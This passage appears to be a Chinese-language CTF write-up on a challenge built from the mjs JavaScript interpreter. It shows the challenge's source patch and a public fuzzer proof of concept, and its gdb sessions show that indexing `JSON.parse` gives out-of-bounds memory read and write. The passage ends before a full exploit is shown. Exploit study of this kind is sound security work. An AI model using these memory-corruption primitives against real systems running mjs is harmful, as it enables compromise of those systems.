比赛期间时间没来得及，赛后解出。
题如其名，是个小型的js解释器。最近出现了不少讲javascript的帖子，下文将讲述作为一个初学者的我是如何一步步分析这题目的。
# 准备
题目给出了目标binary，除了canary其余保护全开，另外还给出了编译方法。
    This is a vulnerable software. I patched some of the vulnerabilities, but I think you can still find a way to exploit it, right? Prove it.
    If you want to build the chall by yourself, plz type the following commands
    git clone https://github.com/cesanta/mjs
    cd mjs
    git reset --hard fd0bf16
    patch -p1 call_stack,
                              -1 - CALL_STACK_FRAME_ITEM_RETVAL_STACK_IDX));
    -          *vptr(&mjs->stack, retval_pos - 1) = mjs_pop(mjs);
    +          mjs_val_t tmp = mjs_pop(mjs);
    +          if (vptr(&mjs->stack, retval_pos - 1) == NULL){
    +            break;
    +          }
    +          *vptr(&mjs->stack, retval_pos - 1) = tmp;
             }
             // LOG(LL_INFO, ("AFTER SETRETVAL"));
             // mjs_dump(mjs, 0, stdout);
    diff --git a/mjs/src/mjs_ffi.c b/mjs/src/mjs_ffi.c
    index aff3939..4a09466 100644
    --- a/mjs/src/mjs_ffi.c
    +++ b/mjs/src/mjs_ffi.c
    @@ -40,7 +40,7 @@ struct cbdata {
     };
     void mjs_set_ffi_resolver(struct mjs *mjs, mjs_ffi_resolver_t *dlsym) {
    -  mjs->dlsym = dlsym;
    +  mjs->dlsym = NULL;
     }
     static mjs_ffi_ctype_t parse_cval_type(struct mjs *mjs, const char *s,
    diff --git a/mjs/src/mjs_object.c b/mjs/src/mjs_object.c
    index 3eaf542..f6fbd35 100644
    --- a/mjs/src/mjs_object.c
    +++ b/mjs/src/mjs_object.c
    @@ -251,8 +251,11 @@ mjs_val_t mjs_next(struct mjs *mjs, mjs_val_t obj, mjs_val_t *iterator) {
       if (*iterator == MJS_UNDEFINED) {
         struct mjs_object *o = get_object_struct(obj);
         p = o->properties;
    -  } else {
    -    p = ((struct mjs_property *) get_ptr(*iterator))->next;
    +  } else { 
    +    p = ((struct mjs_property *) get_ptr(*iterator));
    +    if(p != NULL){
    +      p = p->next;
    +    }
       }
       if (p == NULL) {
    diff --git a/mjs/src/mjs_string.c b/mjs/src/mjs_string.c
    index 65b2e09..70c0214 100644
    --- a/mjs/src/mjs_string.c
    +++ b/mjs/src/mjs_string.c
    @@ -343,6 +343,7 @@ MJS_PRIVATE void mjs_string_index_of(struct mjs *mjs) {
         goto clean;
       }
       str = mjs_get_string(mjs, &mjs->vals.this_obj, &str_len);
    +  if (str_len > strlen(str)) goto clean;
       if (!mjs_check_arg(mjs, 0, "searchValue", MJS_TYPE_STRING, &substr_v)) {
         goto clean;
    @@ -455,7 +456,7 @@ MJS_PRIVATE void mjs_mkstr(struct mjs *mjs) {
       if (offset_v != MJS_UNDEFINED) {
         offset = mjs_get_int(mjs, offset_v);
       }
    -  len = mjs_get_int(mjs, len_v);
    +  len = 0;
       ret = mjs_mk_string(mjs, ptr + offset, len, copy);
    ...
## POC分析
猜测这里的漏洞仍然存在，但我们不用着急深入代码，可以再看看其他issue。然后注意到HongxuChen也提了很多类似的issue，看起来是libFuzzer弄出来的。
点开发下HongxuChen提供了详细信息和全部的poc，见[/https://github.com/ntu-sec/pocs/tree/master/mjs-8d847f2/crashes](/https://github.com/ntu-sec/pocs/tree/master/mjs-8d847f2/crashes)。随便下载一个执行，发现果然crash了。
浏览一下，作者把漏洞类型也标注了，不妨试试`read`和`write`类型的，很快可以发现[/https://github.com/ntu-sec/pocs/blob/master/mjs-8d847f2/crashes/read_mjs.c:9644_1.js](/https://github.com/ntu-sec/pocs/blob/master/mjs-8d847f2/crashes/read_mjs.c:9644_1.js)触发了SIGSEGV。
代码很简单：
    let s ;
    let o = (s);
    let z = JSON.parse[333333333%3333333333] === 'xx'
基本可以确定是`JSON.parse[333333333%3333333333]`导致了读内存崩溃，可以试着gdb调一下。
    Program received signal SIGSEGV, Segmentation fault.                                                                                                                                    [12/575]
    0x0000555555568304 in getprop_builtin_foreign (mjs=0x555555782010, val=18442897249027941072, name=0x555555782860 "74565", name_len=5, res=0x7fffffffd1b0) at src/mjs_exec.c:501
    501         *res = mjs_mk_number(mjs, *(ptr + idx));
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────
     RAX  0x55555556e2d0 (mjs_op_json_parse) ◂— push   rbp
     RBX  0x0
     RCX  0xfff2000000000000
     RDX  0x7fffffffce01 ◂— 0x7fffffffce
     RDI  0x555555782010 ◂— 0x0
     RSI  0x12345
    ...
    ───────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────
     ► 0x555555568304     movzx  ecx, byte ptr [rax + rsi]
       0x555555568308     cvtsi2sd xmm0, ecx
       0x55555556830c     call   mjs_mk_number 
    ...
    ───────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────────
       496
       497   if (!isnum) {
       498     mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "index must be a number");
       499   } else {
       500     uint8_t *ptr = (uint8_t *) mjs_get_ptr(mjs, val);
     ► 501     *res = mjs_mk_number(mjs, *(ptr + idx));
       502   }
       503   return 1;
       504 }
       505
这里源码中的ptr对应rax，是一个函数地址，而idx则对应于rsi，而rsi是我随便给的下标0x12345。也就是说这里可以越界读了，并且这里的函数就是前面说的`getprop_builtin_foreign`。
而对应的越界写也类似，用`JSON.parse[0x12345] = 0x99`即可越界写入。
    RAX  0x55555556e2d0 (mjs_op_json_parse) ◂— push   rbp                                                                                                                                  [11/651]
     RBX  0x0
     RCX  0x99
     RDX  0x4063200000000099
     RDI  0xfff255555556e2d0
     RSI  0x12345
    ...
    ───────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────
     ► 0x555555566e71     mov    byte ptr [rax + rsi], dl
       0x555555566e74     jmp    exec_expr+1785 
    ...
    ───────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────────
       342           mjs_prepend_errorf(mjs, MJS_TYPE_ERROR,
       343                              "only number 0 .. 255 can be assigned");
       344           val = MJS_UNDEFINED;
       345         } else {
       346           uint8_t *ptr = (uint8_t *) mjs_get_ptr(mjs, obj);
     ► 347           *(ptr + ikey) = (uint8_t) ival;
    ...
此时可以仔细看看代码了。
    static int getprop_builtin_foreign(struct mjs *mjs, mjs_val_t val,
                                       const char *name, size_t name_len,
                                       mjs_val_t *res) {
      int isnum = 0;
      int idx = cstr_to_ulong(name, name_len, &isnum);
      if (!isnum) {
        mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, "index must be a number");
      } else {
        uint8_t *ptr = (uint8_t *) mjs_get_ptr(mjs, val);
        *res = mjs_mk_number(mjs, *(ptr + idx));
      }
      return 1;
    }
从函数名字可以参测是对`foreign`类型的对象做`get`的操作。
在`mjs_builtin.c`中有其他定义，
    /*
       * Populate JSON.parse() and JSON.stringify()
       */
      v = mjs_mk_object(mjs);
      mjs_set(mjs, v, "stringify", ~0,
              mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_op_json_stringify));